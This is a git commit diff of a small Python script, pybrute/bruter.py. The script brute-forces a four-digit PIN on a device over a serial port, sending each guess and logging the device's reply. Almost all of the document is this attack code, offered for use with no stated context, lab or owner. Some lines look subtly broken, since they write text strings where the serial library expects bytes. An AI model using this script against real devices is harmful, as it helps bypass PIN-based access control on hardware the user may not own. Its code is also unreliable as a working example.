96440441fb18c20d6a2ec244f693cdc13abffa4c
fjasdlkjf <bla@blub.com>
2020-03-11 11:53:52 -0400

    python bruteforce skript

--- pybrute/bruter.py
+++ pybrute/bruter.py
@@ -1,20 +1,39 @@
-import pyserial 
 import serial
+import time
 
+def read_until(ser, eol):
+	string = b''
+	while True:
+		r = ser.read()
+		#print('got',r)
+		string = string + r
+		if r == eol:
+			break
+	return string
+
+def send_text(ser, text):
+	for i in text:
+		ser.write(i)
+		time.sleep(0.001)
 
 def bruteforce(ser):
-	start = 0
+	start = 7330
 	stop  = 10000
 
-	for i in ragen(start,stop):
-		ser.read_until(b'\0')
-		ser.write("%05.0i" % i)
-		resp = ser.read_until(b'\0')
+	for i in range(start,stop):
+		ser.write(b'r')
+		#print('starting brute at',i)
+		read_until(ser,b':') 
+		text = "%04.0i" % i
+		#print('sending text',text)
+		send_text(ser,text)
+		#print('sent')
+		resp = read_until(ser,b'\n')
 		print('pin',i,'response',resp)
-		ser.write('R');
+		ser.write('r');
 
 
-ser = serial.Serial('/dev/ttyUSB0',115200)  # open serial port
+ser = serial.Serial('/dev/ttyUSB1',115200)  # open serial port
 print(ser.name)         # check which port was really used
 
 bruteforce(ser)
